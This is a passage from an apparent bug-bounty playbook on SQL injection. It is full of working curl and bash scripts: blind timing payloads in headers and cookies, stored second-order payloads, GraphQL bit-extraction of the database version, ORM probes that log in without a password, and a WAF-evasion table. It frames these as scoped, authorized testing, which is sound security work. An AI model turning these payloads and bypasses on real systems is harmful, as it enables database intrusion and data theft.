  at most error disclosure. Operator objects such as `{"status":{"ne":"x"}}` or `{"$gt":5}` are honoured: that is
  the API's filter language or a document store, and the question is which rows it lets you see (BAC-009, NSQ),
  not SQL text. `8-1` returns item 8. `[object Object]` or `Array` shows up in the result: the structure was
  turned into a string and bound.
- **Escalate:** on Node or Rails an accepted object or array where a scalar was expected is often an ORM sink:
  SQL-011. The same arguments behind GraphQL: SQL-009. SQL-014 takes the saved request with `*` inside the JSON
  value.

### SQL-007 · A request header or cookie value is written to or looked up in the database as SQL text

| | |
|---|---|
| **Severity** | High standalone with a conditional delay or a boolean pair and the version prefix read through it; Critical when the request needs no account and the database is the production one |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Blind SQL Injection · CWE-89 |
| **Prior art** | #300176, #297478, #995122, #761304 |

- **Where:** No further gate: every HTTP application receives these values, and whether one of them reaches a
  query cannot be seen without sending it. Headers that get stored or looked up: `User-Agent` (#297478,
  #2599826), `Referer` (#995122, #1018621), `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP` (ban and rate-limit
  tables, audit logs), `Accept-Language` (locale lookup), `Authorization` and `X-Api-Key` (key lookup), custom
  device or tenant headers. Cookies other than the framework session: language, currency, cart or basket id,
  tracking and campaign ids, A/B buckets, "remember me" selectors, and any cookie with an odd name (#300176 was
  two such cookies on a login page; #761304). Send them on requests that are logged: login, sign-up, checkout,
  an error page.
- **Test:** these values usually land in an INSERT or in a lookup whose result you never see, so the signals are a
  500 on one quote that two quotes repair, and a short delay evaluated once. Keep the programme's required
  `User-Agent` and append to it; never replace it.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-007"; mkdir -p "$D"; U="$T/login"
  for i in "${!HDR[@]}"; do [ "${HDR[$i]}" = -A ] && UA="${HDR[$((i+1))]}"; done       # the programme's User-Agent, kept
  t() { curl -sS "${HDR[@]}" $A "$@" --max-time 20 -o "$D/last.body" -w '%{http_code} %{size_download} %{time_total}\n' "$U"; sleep 2; }
  M="'+(SELECT 1 FROM (SELECT SLEEP(2))a)+'"                          # MySQL, MariaDB
  G="'||(SELECT '' FROM pg_sleep(2))||'"                               # PostgreSQL
  O="'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',2) FROM dual)||'"        # Oracle
  X="'; WAITFOR DELAY '0:0:2'-- -"                                     # SQL Server lookup; inside an INSERT try  '); WAITFOR DELAY '0:0:2'-- -
  for pl in "" "'" "''" "$M" "$G" "$O" "$X"; do
    printf 'UA   [%s]  ' "$pl"; t -A "$UA$pl"
    printf 'REF  [%s]  ' "$pl"; t -e "https://$H/$pl"
    printf 'XFF  [%s]  ' "$pl"; t -H "X-Forwarded-For: 203.0.113.7$pl"
    printf 'LANG [%s]  ' "$pl"; t -H "Accept-Language: en$pl"
  done | tee "$D/headers.txt"
  # cookies: rebuild A's Cookie header with one value extended, and send it in place of the stored one
  CK=$(grep -i '^cookie:' "$E/accounts/A.headers" | cut -d' ' -f2-); grep -vi '^cookie:' "$E/accounts/A.headers" > "$D/A-nocookie.headers"
  c() { local new; new=$(python3 -c 'import sys,urllib.parse as u; n,p,c=sys.argv[1:4]; print("; ".join(k+"="+(v+u.quote(p) if k==n else v) for k,v in (x.split("=",1) for x in c.split("; ") if "=" in x)))' "$1" "$2" "$CK")
        curl -sS "${HDR[@]}" -H @"$D/A-nocookie.headers" -H "Cookie: $new" --max-time 20 -o /dev/null -w "%{http_code} %{size_download} %{time_total}  $1 [$2]\n" "$U"; sleep 2; }
  for n in lang currency cart_id; do for pl in "" "'" "''" "$M" "$G"; do c "$n" "$pl"; done; done | tee "$D/cookies.txt"
  ```
  The cookie payload is percent-encoded because PHP, Express and Rails decode cookie values; for a Java or
  ASP.NET back end send it raw as well (replace `u.quote(p)` with `p`). On MySQL in strict mode an INSERT can
  fail on the text in front of the `+` before the subquery runs: for headers other than `User-Agent`, also send
  the payload as the whole value with a numeric start, `0'+(SELECT 1 FROM (SELECT SLEEP(2))a)+'0`. For each hit
  confirm on that header alone: the two-second form, its false twin (`SLEEP(0)` in place of `SLEEP(2)`), the
  four-second form, three rounds, one request at a time.
- **Proof:** the timing table for one header or cookie (base, true two seconds, false, true four seconds, three
  rounds), or the 500 and 200 pair for one and two quotes together with a boolean pair, and the first characters
  of the version read through it. Name the header and the request it was sent on.
- **Not a finding when:** the edge rejects the malformed header (a 400 or 403 with the CDN's or WAF's body): the
  application never saw it. `X-Forwarded-For` is overwritten by the front end, so your value never arrives. A
  signed or encrypted cookie fails to decode with one quote and with two alike: a format check. Changing the
  session cookie logs you out for every payload. The request is slow for any unusual header, the false twin
  included. Nothing happens at all: the header is logged to a file or a log pipeline, not to SQL.
- **Escalate:** log and analytics rows are often written by a queue worker, where no delay reaches the response:
  SQL-013. The same header rendered unescaped in a back-office page is XSS-012. A JWT `kid` header that selects a
  key through a query is JWT-005.

### SQL-008 · A value stored through one request is concatenated into a query that a later request, export or background job runs

| | |
|---|---|
| **Severity** | High standalone with the version and current user read through the consuming request; Critical when the consuming query runs unauthenticated or across tenants; Medium when only an administrator of our own tenant can store the value |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #922567, #1039821, #237597 |

- **Where:** fields our account can set and that other code reads back and reuses: display name, user name,
  company, address, tags, custom field names, slugs, coupon and reference codes, file names of uploads, a saved
  sort or default view, and above all saved searches, segments and report definitions, which are stored query
  parts by design. Rows of an imported file (CSV, XLSX, vCard, a contact or product import): every cell is a
  stored value, and the import job itself looks cells up to de-duplicate (#237597 is a SQL exception raised by a
  product import). Consumers: list and search pages, admin and report views, exports (#922567, export to Excel),
  digests and scheduled jobs. #1039821 shows the pattern in another query language (SOQL): an e-mail and a
  campaign name submitted through a form, injected into a query that runs afterwards.
- **Test:** the insert is usually bound and safe; the developer then trusts what comes out of the database and
  concatenates it elsewhere. Store a marker with one quote, exercise every consumer, and look for a consumer that
  fails with one quote and recovers with two. Confirm with a stored true and false pair, or with a stored delay
  that slows the consumer. Only `AND` forms and the once-evaluated sleep forms: a stored `' OR '1'='1` can turn a
  later `UPDATE ... WHERE name='<stored>'` into an update of every row.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-008"; mkdir -p "$D"
  put() { curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/profile" -H 'Content-Type: application/json' \
            -d "$(jq -cn --arg v "$1" '{display_name:$v}')" -o /dev/null -w "%{http_code} stored: $1\n"; sleep 1; }
  use() { for u in "$T/api/v1/team/members?sort=name" "$T/api/v1/reports/activity" "$T/api/v1/export/members.csv"; do
            curl -sS "${HDR[@]}" $A "$u" -o "$D/use.body" -w "%{http_code} %{size_download} %{time_total}  $u\n"; sleep 1; done; }
  put "sql008";               use | tee "$D/1-clean.txt"
  put "sql008'";              use | tee "$D/2-quote.txt"        # a consumer that now fails or changes
  put "sql008''";             use | tee "$D/3-two-quotes.txt"   # and recovers
  put "sql008' AND '1'='1";   use | tee "$D/4-true.txt"
  put "sql008' AND '1'='2";   use | tee "$D/5-false.txt"
  put "sql008'+(SELECT 1 FROM (SELECT SLEEP(2))a)+'"; use | tee "$D/6-sleep.txt"   # PostgreSQL: sql008'||(SELECT '' FROM pg_sleep(2))||'
  put "Test User A"                                             # restore the field
  # import: one row with one quote, one with two; then read the import report and run use() again
  printf 'email,name\nsql008-a@example.com,%s\nsql008-b@example.com,%s\n' "imp008'" "imp008''" > "$D/import.csv"
  curl -sS "${HDR[@]}" $A -F "file=@$D/import.csv;type=text/csv" "$T/api/v1/contacts/import" -D- -o "$D/import.body"
  ```
  Reading through a stored payload costs one store and one consume request per question. Keep it to the first
  characters of the version: store `sql008' AND ASCII(SUBSTRING(version(),1,1))>52 AND '1'='1`, read the
  consumer, and binary-search as in any boolean oracle. Where the consumer prints database errors, store the
  error-based expression instead (`sql008' AND extractvalue(1,concat(0x7e,version(),0x7e,current_user()))-- -` on
  MySQL) and read the answer in one step.
- **Proof:** the store request, the consuming request, and three consumer results side by side: clean value
  normal, payload value failing, slow or filtered, repaired value normal again. Then the version (or its first
  characters) and the current user read through the consumer. Say who runs the consumer: any user, an
  administrator, a nightly job.
- **Not a finding when:** the stored quote comes back as `\'` or `&#39;` and the consumer never sees a raw quote.
  The consumer fails for a rendering reason (a CSV writer, an HTML template) and not with a database error. The
  export is slow for the clean value too. The import answers with validation messages per row ("invalid e-mail").
  A SQL exception during import without any true and false or timing difference is error disclosure (INF-009),
  as in #237597, which carries no bounty.
- **Escalate:** a consumer that runs in a background job gives no response to read: SQL-013 with the lookup
  payload as the stored value. A payload stored by one tenant and executed by a job that serves all tenants is
  cross-tenant; describe it and do not read another tenant's rows. Remove every stored payload when done.

### SQL-009 · A GraphQL argument is concatenated into the SQL query of its resolver

| | |
|---|---|
| **Severity** | High standalone with the version and current user read through the argument; Critical when the operation needs no session and the database is the production one |
| **Requires** | graphql |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #435066 |

- **Where:** arguments of type `String` and `ID` that select a record (#435066: a `uuid` argument); arguments
  named `filter`, `where`, `search`, `query`, `orderBy`, `sort`, `order`, `groupBy` when their type is `String`
  or a custom scalar (`JSON`, `JSONObject`, `Any`) and not an enum or a generated input type; pagination
  cursors (`after`, `before`), which are often base64 of a column value or of a small JSON object that the
  resolver puts back into a `WHERE (created_at, id) < (...)` clause. Hand-written resolvers, not generated APIs.
- **Test:** the type system checks shape, not content. Send every payload in `variables`: a quote inside the
  query document is a GraphQL syntax error and never reaches the resolver. Run the SQL-001 pairs on string
  arguments, the SQL-005 expressions on sort arguments, and decode, modify and re-encode cursors. Aliases let
  one request ask several conditions, which makes the read short.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-009"; mkdir -p "$D"; G="$T/graphql"
  g() { curl -sS "${HDR[@]}" $A -X POST "$G" -H 'Content-Type: application/json' -d "$1" -o "$D/last.json" \
          -w '%{http_code} %{size_download} %{time_total}  '; jq -c '{data:(.data|tostring|.[0:70]),errors:[.errors[]?.message|.[0:90]]}' "$D/last.json"; sleep 1; }
  # candidate arguments from introspection (or from the operations saved in recon when introspection is off)
  g '{"query":"{__schema{types{name fields{name args{name type{name kind ofType{name kind}}}}}}}"}' >/dev/null; cp "$D/last.json" "$D/args.json"
  jq -r '.data.__schema.types[]|select(.fields!=null and (.name|startswith("__")|not))|.name as $t|.fields[]|.name as $f|.args[]
         |(.type.name // .type.ofType.name) as $n|select(["String","ID","JSON","JSONObject","Any"]|index($n))|"\($t).\($f)(\(.name): \($n))"' "$D/args.json" | sort -u
  # string argument: quote, two quotes, boolean pair
  Q='query($v:String!){order(reference:$v){id status}}'
  for v in "A1001" "A1001'" "A1001''" "A1001' AND '1'='1" "A1001' AND '1'='2"; do g "$(jq -cn --arg q "$Q" --arg v "$v" '{query:$q,variables:{v:$v}}')"; done
  # sort argument typed String
  Q='query($v:String){orders(orderBy:$v,first:3){nodes{id}}}'
  for v in "id" "id desc" "9999" "id*(CASE WHEN (1=1) THEN 1 ELSE -1 END)" "id*(CASE WHEN (1=2) THEN 1 ELSE -1 END)"; do g "$(jq -cn --arg q "$Q" --arg v "$v" '{query:$q,variables:{v:$v}}')"; done
  # cursor: fetch one, decode it, add a quote, re-encode
  g '{"query":"{orders(first:3){pageInfo{endCursor} nodes{id}}}"}' >/dev/null
  C=$(jq -r '.data.orders.pageInfo.endCursor // empty' "$D/last.json"); printf '%s' "$C" | base64 -d; echo
  C2=$(printf "%s'" "$(printf '%s' "$C" | base64 -d)" | base64 -w0)
  g "$(jq -cn --arg c "$C2" '{query:"query($c:String){orders(first:3,after:$c){nodes{id}}}",variables:{c:$c}}')"
  # read one character per request: seven aliases, one bit each (Oracle: BITAND(x,64) for x&64)
  bits() { python3 - "$1" "$2" <<'PY'
  import json, sys
  expr, i = sys.argv[1], int(sys.argv[2])
  q = "query(" + ",".join("$b%d:String!" % k for k in range(7)) + "){" + " ".join("b%d:order(reference:$b%d){id}" % (k, k) for k in range(7)) + "}"
  v = {"b%d" % k: "A1001' AND (ASCII(SUBSTRING((%s),%d,1))&%d)>0-- -" % (expr, i, 1 << k) for k in range(7)}
  print(json.dumps({"query": q, "variables": v}))
  PY
  }
  for i in $(seq 1 24); do g "$(bits 'version()' "$i")" >/dev/null
    jq -j '[.data|to_entries[]|select(.value!=null)|.key[1:]|tonumber|pow(2;.)]|add // 0|if .>0 then [.]|implode else empty end' "$D/last.json"; done | tee "$D/version.txt"; echo
  ```
  A field that returns a list answers `[]` and not `null` for false: change `select(.value!=null)` to
  `select(.value|length>0)`. Seven aliases are seven database queries: count them against `$RATE`.
- **Proof:** the boolean pair sent in `variables` with different `data`, and the version and current user read
  through the argument, with the raw requests and responses. Name the operation, the argument and whether a
  session was needed.
- **Not a finding when:** the error is the GraphQL layer's: `Syntax Error`, `Variable "$v" got invalid value`,
  `ID cannot represent value`, `Expected type Int`. The filter and order arguments are generated input types
  (Hasura `_eq` and `_like`, PostGraphile, Prisma): their operators are the API and they bind values; what
  matters there is which rows they return (GQL-003). The search field is served by a search engine. A changed
  cursor gives "invalid cursor" for any modification: it is signed or validated.
- **Escalate:** SQL-014 takes the saved raw request with `*` inside the variables value. Arguments evaluated by
  a document store or a search engine are GQL-009 and the NSQ chapter. An unauthenticated operation makes the
  finding pre-auth: say so.

### SQL-010 · A search term or filter expression is translated into SQL text

| | |
|---|---|
| **Severity** | High standalone with a boolean or in-band read through the search or filter parameter; Medium for a wildcard accepted by an exact-match lookup of a secret code or token; None for wildcards in a search box |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #852306, #2433970, #3395221, #1893800 |

- **Where:** No further gate: search and filtering exist wherever parameters do. Search boxes, autocomplete and
  typeahead endpoints, "advanced search" forms (#3395221: a `keyword` parameter; #1893800: a search feature);
  filter languages in one parameter: `filter=status eq 'open'`, OData `$filter`, RSQL (`name==x;age=gt=3`),
  `q=author:bob created:>2024-01-01`; parameters that already look like a piece of SQL: `where=`, `conditions=`,
  `criteria=` (#2433970: a `where` parameter); report and segment builders; DataTables `search[value]` and
  `columns[0][search][value]`.
- **Test:** three mechanisms. A term placed in `LIKE '%term%'` needs the pattern closed before the condition. A
  filter language translated by string building passes its literals, field names or the whole expression into
  the statement. An exact-match lookup of a secret (coupon, invite or reset code, API key) done with `LIKE`
  accepts `%` and `_` as patterns; #852306 was paid $8,000 under the title "SQL LIKE clauses wildcard injection"
  (the report body is not in the library, so the test here is the general one).
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-010"; mkdir -p "$D"; U="$T/api/search"; P=q; V=invoice
  s() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/last.body" -w '%{http_code} %{size_download} %{time_total}  '
        printf 'n=%s  %s\n' "$(jq -r '.total // (.results|length)' "$D/last.body" 2>/dev/null)" "$1"; sleep 1; }
  s "$V"; s "$V'"; s "$V''"
  s "$V%' AND '%'='"; s "$V%' AND '%'='x"            # ... LIKE '%V%' AND '%'='%'   against   ... AND '%'='x%'
  s "$V%' AND 1=1-- -"; s "$V%' AND 1=2-- -"
  s "$V%') AND ('%'='"; s "$V%') AND ('%'='x"        # the LIKE sits inside parentheses (several columns joined by OR)
  # a filter language or a where parameter
  P=filter
  s "status eq 'open'"; s "status eq 'open''"; s "nosuchcolumn eq 'x'"
  s "status eq 'open' and 1 eq 1"; s "status eq 'open' and 1 eq 2"
  s "status eq 'open') AND (1=1"; s "status eq 'open') AND (1=2"
  P=where
  s "status='open'"; s "status='open' AND 1=1"; s "status='open' AND 1=2"; s "status='open' AND ASCII(SUBSTRING(version(),1,1))>52"
  # exact-match lookup of a secret, on a code that belongs to our own account
  for c in 'SQL010-7F3K9' 'SQL010-%' 'SQL010-7F3K_' '%'; do
    curl -sS "${HDR[@]}" $A --get --data-urlencode "code=$c" "$T/api/coupons/check" -o /dev/null -w "%{http_code} %{size_download}  $c\n"; sleep 1; done
  ```
  With a true and false pair in hand, read the version and the current user through it: put
  `ASCII(SUBSTRING(version(),i,1))>n` in place of `1=1` and binary-search n from 32 to 126 for i from 1 to 24,
  eight requests per character, one request per second.
- **Proof:** the true and false pair in the search or filter position and the version and current user read
  through it. For the wildcard case: our own code accepted as `SQL010-%` by an endpoint that is meant to match it
  exactly, which shows that a code can be recovered prefix by prefix; shown on our own code only.
- **Not a finding when:** `%` and `_` act as wildcards in a search box: that is search, and the rows returned are
  rows the caller may list anyway (rows the caller may not list are BAC-009). A term with an unbalanced `"` or
  `(` raises a full-text error (`syntax error in tsquery`, MySQL boolean-mode `syntax error, unexpected $end`):
  the term reached the full-text parser as a bound value. The error is Lucene's, Solr's or Elasticsearch's
  (`parse_exception`, `Cannot parse`, `org.apache.solr`): NSQ chapter; #952501 was a Solr injection the
  programme judged low impact, and #844428, another, paid $100. The filter language is documented, unknown
  fields get a 400, and both members of every pair behave alike. A pattern such as `%a%b%c%` is slow: that is the
  cost of `LIKE` (`dos`).
- **Escalate:** sort keys inside the same filter language: SQL-005. SQL-014 with `-p q` and the `--prefix` and
  `--suffix` that reproduce the closing you found (`--prefix="%'" --suffix="-- -"`).

### SQL-011 · Request data reaches an ORM method that takes a raw SQL fragment or builds SQL from the structure of its argument

| | |
|---|---|
| **Severity** | High standalone with a read proven through the ORM sink; Critical when the request needs no account, or when the same request shape signs in to our own account without its password; Medium for a lookup widened on our own objects only |
| **Requires** | ruby\|python\|node\|php\|java |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #298176, #2646493, #2588426, #506654 |

- **Where:** applications whose framework was fingerprinted, on endpoints that pass request structure straight to
  the model layer: list endpoints with `sort`, `order`, `fields`, `filter[...]`, `where[...]` or arbitrary query
  keys; JSON bodies used directly as conditions; lookups by token, code or id in a JSON body. Use the block for
  the detected technology. The framework's error class in a 500 names the sink; debug pages (INF-006, INF-007)
  print the statement.
- **Test:** two mechanisms. Raw-fragment methods take a string and put it into the statement: Rails `order`,
  `reorder`, `pluck`, `select`, `group`, `having`, `joins` and `where("...")`; Django `extra()`, `RawSQL` and
  `raw()`; Sequelize `literal()`; knex `whereRaw` and `orderByRaw`; Laravel `whereRaw`, `orderByRaw` and
  `DB::raw`; MyBatis `${...}`; HQL built by concatenation. Structure-driven building: the type or the keys of the
  argument decide the SQL: a string where a hash was expected becomes a raw condition (Rails `where`), an object
  where a scalar was expected becomes `` `key` = value `` (the `mysql` and `mysql2` drivers), a key becomes a JSON
  path that is concatenated (Django JSONField lookups, #2588426 and #2646493; Laravel `column->path`).
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-011"; mkdir -p "$D"
  r() { curl -sS "${HDR[@]}" $A "$@" -o "$D/last.body" -w '%{http_code} %{size_download} %{time_total}  '; sleep 1
        grep -aoE "ActiveRecord::[A-Za-z]+|PG::[A-Za-z]+|Mysql2::Error|FieldError|Cannot resolve keyword[^<]{0,100}|ProgrammingError|OperationalError|SequelizeDatabaseError|ER_[A-Z_]+|QueryFailedError|QueryException|json_extract|SQLSTATE\[[0-9A-Z]+\][^<]{0,60}|QuerySyntaxException|org\.hibernate[A-Za-z.]*|\[Syntax Error\] line [0-9]+, col [0-9]+" "$D/last.body" | sort -u | tr '\n' ' '; echo; }
  ORD_T="id*(CASE WHEN (1=1) THEN 1 ELSE -1 END)"; ORD_F="id*(CASE WHEN (1=2) THEN 1 ELSE -1 END)"

  # ruby (Rails, ActiveRecord)
  r --get --data-urlencode "sort=name desc nulls last" "$T/projects.json"       # more than a column is accepted: the string reaches order()
  r --get --data-urlencode "sort=$ORD_T" "$T/projects.json"; r --get --data-urlencode "sort=$ORD_F" "$T/projects.json"   # the row order flips
  r --get --data-urlencode "fields=id,version()" "$T/projects.json"             # pluck() or select(): the version in a column
  r --get --data-urlencode "filter=1=1" "$T/projects.json"; r --get --data-urlencode "filter=1=2" "$T/projects.json"     # a string where filter[...] was expected: where("1=2")

  # python (Django)
  r --get --data-urlencode "nosuchfield=1" "$T/api/items/"                      # FieldError "Cannot resolve keyword ... Choices are": the keys are ORM lookups
  r --get --data-urlencode "data__a=1" "$T/api/items/"; r --get --data-urlencode "data__a'b=1" "$T/api/items/"   # data = a JSONField from the Choices list: empty list, then a database error
  r --get --data-urlencode "fields=data__a'b" "$T/api/items/"                   # the same key through values() or values_list() (#2646493)
  r --get --data-urlencode "ordering=app_item.id" "$T/api/items/"               # app_item = the table (<app>_<model>); table.column accepted by order_by(): Django 3.1 and 3.2 before the July 2021 fix
  r --get --data-urlencode "ordering=app_item.$ORD_T" "$T/api/items/"; r --get --data-urlencode "ordering=app_item.$ORD_F" "$T/api/items/"

  # node (mysql and mysql2 drivers, Sequelize, knex, TypeORM)
  EMAIL_A='a-test@example.com'                                                  # the login e-mail of our own account A
  r -X POST "$T/api/login" -H 'Content-Type: application/json' -d "$(jq -cn --arg e "$EMAIL_A" '{email:$e,password:{password:1}}')"   # password = `password` = 1
  r -X POST "$T/api/me/tokens/check" -H 'Content-Type: application/json' -d '{"token":{"token":1}}'       # a lookup scoped to our own session
  r -X POST "$T/api/me/tokens/check" -H 'Content-Type: application/json' -d '{"token":{"$ne":"x"}}'       # Sequelize 4 and older: $-operators taken from JSON
  r --get --data-urlencode "sort=$ORD_T" "$T/api/items"; r --get --data-urlencode "sort=$ORD_F" "$T/api/items"           # sequelize.literal(), knex.orderByRaw()

  # php (Laravel, Doctrine)
  r --get --data-urlencode "sort=name->ab" "$T/api/items"                       # json_extract or error 3141 "Invalid JSON text": the value is a column name for orderBy()
  r --get --data-urlencode "sort=name->a'b" "$T/api/items"                      # error 1064 here and 3141 above: the JSON path is not escaped
  r --get --data-urlencode "sort=$ORD_T" "$T/api/items"; r --get --data-urlencode "sort=$ORD_F" "$T/api/items"           # orderByRaw()
  r --get --data-urlencode "name=x'" "$T/api/items"                             # "[Syntax Error] line 0, col N": Doctrine DQL built by concatenation

  # java (Hibernate HQL or JPQL, MyBatis)
  r --get --data-urlencode "name=x'" "$T/api/items"                             # QuerySyntaxException, "unexpected char": HQL, not SQL
  r --get --data-urlencode "name=x' AND '1'='1" "$T/api/items"; r --get --data-urlencode "name=x' AND '1'='2" "$T/api/items"
  r --get --data-urlencode "name=x' AND SUBSTRING(version(),1,1)='8" "$T/api/items"   # Hibernate 5 passes unknown functions to the database
  r --get --data-urlencode "sort=$ORD_T" "$T/api/items"; r --get --data-urlencode "sort=$ORD_F" "$T/api/items"           # MyBatis ${sort}
  ```
  The object probes change which rows a query matches. Send them only to login as our own account and to lookups
  that the server scopes to our session, and stop at the first response. With an order flip or a true and false
  pair in hand, read the version and the current user through it: put `ASCII(SUBSTRING(version(),i,1))>n` in
  place of `1=1` and binary-search n from 32 to 126 for i from 1 to 24, one request per second.
- **Proof:** the request, the framework error or behaviour that identifies the sink, the true and false pair,
  and the version and current user read through it. For the driver object case: a session for account A issued
  to a request that did not contain A's password, next to the same request with a wrong string password being
  refused. For HQL and DQL, where database functions may be unavailable, the pair plus a subquery condition over
  a mapped entity that is true (`(SELECT COUNT(u) FROM User u)>0`).
- **Not a finding when:** Rails answers `ActiveRecord::UnknownAttributeReference` (6.1 and later refuse
  non-column strings in `order` and `pluck`) or `ActiveModel::ForbiddenAttributesError` (unpermitted parameters).
  Django answers `FieldError` to every key that is not a model field and an empty list to `data__a'b`: lookups
  are validated and the JSON key is bound. Expanded lookups without SQL injection still let a caller filter on
  hidden fields (`user__password__startswith=`): real, and filed under BAC-009. An object where a string is
  expected gives 400 or `[object Object]`. `$ne` is honoured because the API documents a filter language. The
  Laravel `->` probe gives the same error with and without the quote.
- **Escalate:** pin the ORM version from an error page or a lock file and take the matching advisory to the CVE
  chapter; the disclosed ORM reports are #2646493, #2588426, #3335709 and #3292573 (Django), #506654 (TypeORM),
  #28450 (Active Record) and #1390331 (doctrine/dbal). SQL-014 for the table names once a boolean or order
  oracle holds.

### SQL-012 · A WAF blocks the injection strings while an equivalent spelling or request form reaches the same query

| | |
|---|---|
| **Severity** | None standalone; restores the level of the injection it unblocks |
| **Requires** | waf |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #383127, #258582, #301257, #549355 |

- **Where:** an injection point that another item has already shown with harmless values (`8-1`, `7'||'`, a row
  order flip), where the reading payload gets the WAF's block page, a 403 or 406, or a challenge. Confirm that
  the WAF answers and not the application: the block has its own body and headers (a ray or reference id, a
  vendor name) and appears for the same string on any path. #383127 (blind, with an Akamai bypass, $25,000),
  #258582 ($1,000) and #549355 are SQL injection reports that mention the bypass; none is a report about the WAF.
- **Test:** a method, not a list. Find the smallest token that triggers the block. Prove the injection with
  syntax that needs no keyword at all. Then respell only the blocked token: another whitespace, another
  operator, another function, a comment inside the keyword. If the grammar is blocked whatever the spelling,
  change where the value travels: body instead of query, JSON instead of form, a duplicated parameter, padding
  beyond the inspected size. Every block counts against your address: keep the bisection under about thirty
  requests, two seconds apart, and stop when a ban or challenge appears.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-012"; mkdir -p "$D"; U="$T/item"; P=id; V=7
  w() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/last.body" -w '%{http_code} %{size_download}  '; printf '%s\n' "$1" | tr '\n\t' '  '; sleep 2; }
  # 1. which token is blocked?
  for x in "$V'" "$V AND 1=1" "$V and 1=1" "$V UNION SELECT 1" "$V SLEEP(1)" "$V-- -" "$V/**/" "version()" "information_schema" "$((V+1))-1" "$V'||'"; do w "$x"; done | tee "$D/tokens.txt"
  # 2. the same condition, respelled one change at a time
  w "$V"$'\n'"AND"$'\n'"1=1"; w "$V"$'\t'"AND"$'\t'"1=1"          # newline or tab for the space
  w "$V/**/AND/**/1=1"; w "$V AND(1)=(1)"                           # comment for the space; no spaces at all
  w "$V && 1=1"; w "$V AND 1 LIKE 1"; w "$V AND 1 BETWEEN 1 AND 1"; w "$V AND 2>1"       # other operators (&& is MySQL)
  w "$V /*!50000AND*/ 1=1"                                          # MySQL versioned comment
  w "$V AND JSON_LENGTH('{}')=0"                                    # JSON functions many rule sets do not parse; PostgreSQL: AND '{}'::jsonb='{}'::jsonb
  # 3. the same value somewhere the WAF reads differently
  curl -sS "${HDR[@]}" $A -X POST "$U" --data-urlencode "$P=$V AND 1=1" -o /dev/null -w '%{http_code} body\n'; sleep 2
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/json' -d "$(jq -cn --arg p "$P" --arg v "$V AND 1=1" '{($p):$v}')" -o /dev/null -w '%{http_code} json\n'; sleep 2
  curl -sS "${HDR[@]}" $A -X POST "$U" --form-string "$P=$V AND 1=1" -o /dev/null -w '%{http_code} multipart\n'; sleep 2
  curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$V" --data-urlencode "$P=$V AND 1=1" "$U" -o /dev/null -w '%{http_code} duplicate\n'; sleep 2
  PAD=$(head -c 9000 /dev/zero | tr '\0' a)                         # then 65000 and 129000: common body inspection limits
  curl -sS "${HDR[@]}" $A -X POST "$U" --data-urlencode "pad=$PAD" --data-urlencode "$P=$V AND 1=1" -o /dev/null -w '%{http_code} padded\n'
  ```
  ```text
  blocked token        equivalents
  space                /**/   newline, tab, 0x0b, 0x0c, 0xa0 (MySQL)   parentheses: AND(1)=(1)
  AND / OR             &&  ||  (MySQL)      the condition as arithmetic: 7-(CASE WHEN (COND) THEN 0 ELSE 1 END)
  =                    LIKE   IN (..)   BETWEEN a AND a   <>  with the branches swapped
  quoted strings       0x61626364 (MySQL)   CHAR(97,98)   CHR(97)||CHR(98) (PostgreSQL, Oracle)   $$abc$$ (PostgreSQL)
  SUBSTRING            MID   SUBSTR   LEFT / RIGHT   x LIKE 'a%'     #297534 used mid(); #301257 used /**/LIKE/**/ and a hex literal
  ASCII                ORD   HEX   UNICODE
  comma                SUBSTRING(x FROM 1 FOR 1)   LIMIT 1 OFFSET 0   UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
  SLEEP(n)             no harmless equivalent: BENCHMARK and heavy queries load the database; prefer a boolean oracle
  UNION SELECT         /*!50000UNION*/ /*!50000SELECT*/ (MySQL)   UNION ALL SELECT   or leave UNION out and read blind
  ```
  For SQL-014, pass the one spelling that worked as a tamper script (`--tamper=space2comment`, `between`,
  `equaltolike`); do not cycle through the tamper list against the target.
- **Proof:** inside the report of the injection: `tokens.txt` (what is blocked), the blocked request, the passing
  equivalent, and the version and current user read with the passing spelling through the WAF. Do not file a
  report whose claim is "WAF bypass".
- **Not a finding when:** the respelled request passes the WAF and the application is not injectable: there was
  nothing to unblock, and a rule gap alone belongs to the WAF vendor (`third-party`). A 200 whose body is a
  JavaScript or CAPTCHA challenge is a block. The "true and false" difference is the WAF passing one spelling and
  blocking the other. The bypass works only against the origin server's address, which is another asset: check
  scope before touching it.
- **Escalate:** back to the item that found the injection, with the passing grammar in its `ask` function. Note
  which technique passed: the same WAF usually fronts the programme's other assets.

### SQL-013 · A blind injection makes the database server look up a host name we control, carrying the current user in the name

| | |
|---|---|
| **Severity** | High standalone with the current user or version arriving in a DNS label; Critical when the request needs no account and the database is the production one; Medium for a lookup that carries no data |
| **Requires** | oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Blind SQL Injection · CWE-89 |
| **Prior art** | #60420, #922567 |

- **Where:** injection points with no channel in the response: stored values run by a queue worker or a nightly
  job (SQL-008), headers written to a log table (SQL-007), statements whose timing is too noisy for SQL-004. It
